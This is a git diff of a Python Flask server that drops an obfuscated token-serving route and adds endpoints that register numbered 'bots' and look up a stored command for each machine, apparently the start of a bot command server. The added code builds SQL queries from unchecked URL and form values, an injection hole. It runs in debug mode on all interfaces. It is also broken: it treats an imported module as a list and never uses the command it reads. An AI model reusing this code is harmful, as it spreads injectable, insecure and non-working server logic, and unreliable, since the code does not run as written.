@@ -1,40 +1,56 @@
 from flask import Flask
 from flask import request, jsonify
-from crypter import Crypterast
-from random import choice
 from db import DB
-import os
-
+import midlware as md
+import new
+import bots
 
 app = Flask(__name__)
 db = DB()
-cr = Crypterast()
 
 
+lst = db.read(f"config_list WHERE name = 'pc0'", 'token')
+print(lst)
+    
 @app.route('/')
 def home():
     return 'You are at home page.'
 
 
-@app.route("/kerc1syuif&x^9!x*fl9kh@8vw05u4wlsf22ch9r", methods=['POST'])
-def get_tok():
+@app.route('/get/<question>')
+def find_question(question):
+    if question == 'new':
+
+        if bots == []:
+            num = 'pc0'
+        else:
+            num = 'pc' + str(int(bots[-1][2:])+1)
+
+        try:
+            token = md.generate_token()
+            hash_token = md.hash_password(token)
+            db.write('config_list', '`name`,`token`', f"'{num}','{hash_token}'")
+            bots.append(num)
+            return jsonify({'name': num, 'token': token})
+
+        except:
+            return jsonify({'name': False})
+            
+
+
+@app.route("/pull/<pc>", methods=['POST'])
+def get_tokdeed(pc):
     if request.method == "POST":
-        key = request.form['8aij&wvq0!1ow^5&x-mdl4sny!gniqxqa-yg*tfy']
-        db = DB()
-        for files in os.listdir('config'):
-            try:
-                db.write('config_list', 'name', f"'{files}'")
-            except:
-                pass
-        lst = db.read('config_list WHERE life = 0', 'name')
-        print(lst)
-        free_token = choice([i[0] for i in lst])
-        db.update('config_list', 'life = True', f"name = '{free_token}'")
-        with open('config/'+free_token, 'rb') as dt:
-            data = dt.read()
-        t = cr.import_key(key, data)
-        return t
+        token = request.form['token']
+        lst = db.read(f"events WHERE name = '{pc}'", 'command')
+        if md.check_password(lst, token):
+            command = request.form['command']
+            # with open('new.py','a') as f:
+            #     f.write('\na = 3')
+
+        return {'token': False}
+        
 
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=9566)
+    app.run(host='0.0.0.0', port=9566, debug=True)
